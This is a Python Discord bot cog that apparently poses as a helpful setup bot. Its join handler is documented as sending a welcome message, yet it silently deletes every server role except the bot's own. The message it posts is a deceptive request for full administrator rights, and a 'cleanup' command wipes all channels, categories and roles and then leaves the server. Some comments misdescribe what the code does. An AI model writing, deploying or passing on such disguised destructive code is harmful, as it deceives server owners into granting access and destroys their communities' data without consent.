import discord
from redbot.core import commands

class CleanupGuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def on_guild_join(self, guild):
        """
        Event handler to send a welcome message when the bot joins a new guild.
        """
        bot_role = guild.get_member(self.bot.user.id).top_role

        # Remove all roles except the bot's role
        for role in guild.roles:
            if role != bot_role:
                await role.delete()

        # Send a welcome message
        welcome_message = (
            "Hello there! I'm SNT, **your** super advanced and useful discord bot. "
            "I will automatically set up myself for this server. "
            "To start, please give me a role with full administrator permissions! "
            "I will be set up in no time."
        )

        for channel in guild.text_channels:
            try:
                await channel.send(welcome_message)
                break  # Stop after sending the message in the first available text channel
            except discord.Forbidden:
                pass  # Ignore channels where the bot cannot send messages

    @commands.command()
    @commands.guild_only()
    @commands.is_owner()
    async def cleanupguild(self, ctx, category_name: str = "General Category", channel_name: str = "general"):
        """
        Cleanup the guild by:
        1. Deleting all channels and leaving 1 category
        2. Renaming the category to the specified name
        3. Creating a new channel with the specified name
        4. Removing all roles except the bot's role
        5. Leaving the server
        """
        guild = ctx.guild

        # Delete all channels except the default one
        for channel in guild.channels:
            if not isinstance(channel, discord.CategoryChannel) and channel != ctx.channel:
                await channel.delete()

        # Find and rename the last remaining category
        categories = [category for category in guild.categories if category.name != category_name]
        for category in categories:
            await category.delete()

        # Create a new category with the specified name
        category = await guild.create_category(category_name)

        # Create a new text channel inside the category
        await guild.create_text_channel(channel_name, category=category)

        # Remove all roles except the bot's role
        bot_role = guild.get_member(self.bot.user.id).top_role
        for role in guild.roles:
            if role != bot_role:
                await role.delete()

        # Leave the server
        await guild.leave()

def setup(bot):
    bot.add_cog(CleanupGuild(bot))
